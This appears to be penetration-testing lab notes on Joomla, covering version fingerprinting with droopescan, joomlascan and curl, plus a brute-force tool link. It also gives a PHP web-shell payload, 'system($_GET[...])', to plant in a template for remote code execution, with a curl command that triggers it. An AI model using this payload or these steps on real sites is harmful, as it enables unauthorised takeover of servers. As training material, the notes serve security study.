
## Discovery/Footprinting

[Login Brute-Forcing](https://github.com/ajnik/joomla-bruteforce). 

```sh
droopescan scan joomla --url http://dev.inlanefreight.local
### Enumeration with droopescan

python2.7 joomlascan.py -u http://dev.inlanefreight.local
### Enumeration with joomlascan

curl -s http://dev.inlanefreight.local/ | grep Joomla
### Check Webpage Source

curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
### Some Joomla versions may be fingerprinted from this file

http://dev.inlanefreight.local/plugins/system/cache/cache.xml
### The `cache.xml` file can give out an `approximate version` of Joomla

http://dev.inlanefreight.local/media/system/js/
### Some versions can be fingerprinted by analyzing the JS files in here

http://blog.inlanefreight.local/robots.txt
http://dev.inlanefreight.local/README.txt
### Check for references to Joomla
```

---
## **Joomla Known Vulnerabilities**

1. **PHP TEMPLATE CODE INJECTION TO RCE \[Requires Admin Account]**
   * The basic idea is to add PHP code inside a template
   * Login as Admin - Navigate to Configuration - Select a Template - Select an existing PHP file - add the following payload:
   * `system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);`
   * `curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id`

2. **Joomla 3.9.4 directory traversal** [**CVE-2019-10945**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945)
   * Exploit 1: <https://www.exploit-db.com/exploits/46710>
   * Exploit 2: <https://github.com/dpgg101/CVE-2019-10945>

---